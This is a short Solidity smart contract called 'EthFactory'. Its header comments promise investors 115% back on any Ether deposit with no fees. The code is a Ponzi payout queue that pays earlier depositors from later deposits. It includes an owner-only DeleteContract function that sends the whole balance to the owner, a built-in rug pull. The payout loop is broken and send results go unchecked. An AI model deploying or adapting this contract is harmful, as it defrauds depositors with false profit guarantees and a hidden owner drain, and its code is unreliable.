1 ///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Welcome to EthFactory!
2 //
3 // Multiply your Ether by +15% !!
4 //
5 // NO MINIMUM DEPOSIT !!
6 //
7 // NO HOUSE FEES !!
8 //
9 // Everyone gets paid in the line! After somebody has been paid, he is removed and the next person is in line for payment !
10 //
11 // Invest now, and you will Earn back 115%, which is your [Invested Ether] + [15% Profit] !
12 //
13 // Multiply your ETH Now !
14 //
15 ///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Start
16 
17 contract EthFactory{
18 
19   struct InvestorArray { address EtherAddress; uint Amount; }
20   InvestorArray[] public depositors;
21 
22 ///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Variables
23 
24   uint public Total_Investors=0;
25   uint public Balance = 0;
26   uint public Total_Deposited=0;
27   uint public Total_Paid_Out=0;
28   string public Message="Welcome Investor! Multiply your ETH Now!";
29   address public owner;
30   modifier manager { if (msg.sender == owner) _ }
31   function EthFactory() {owner = msg.sender;}
32   function() { enter(); }
33   
34 ///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Enter
35 
36   function enter() {
37     if (msg.value > 0) {
38 
39     uint Amount=msg.value;								//set amount to how much the investor deposited
40     Total_Investors=depositors.length+1;   					 //count investors
41     depositors.length += 1;                        						//increase array lenght
42     depositors[depositors.length-1].EtherAddress = msg.sender; //add net investor's address
43     depositors[depositors.length-1].Amount = Amount;          //add net investor's amount
44     Balance += Amount;               						// balance update
45     Total_Deposited+=Amount;       						//update deposited Amount
46     uint payment; uint index=0;
47 
48     while (Balance > (depositors[index].Amount * 115/100) && index<Total_Investors)
49      {
50 	if(depositors[index].Amount!=0 )
51 	{
52       payment = depositors[index].Amount *115/100;                           //calculate pay out
53       depositors[index].EtherAddress.send(payment);                        //send pay out to investor
54       Balance -= depositors[index].Amount *115/100;                         //balance update
55       Total_Paid_Out += depositors[index].Amount *115/100;           //update paid out amount   
56        depositors[index].Amount=0;                                    //remove investor from the game after he is paid out! He must invest again if he wants to earn more!
57 	}break;
58       }
59   }
60 }
61 function DeleteContract() manager { owner.send(Balance); Balance=0; }
62 
63 }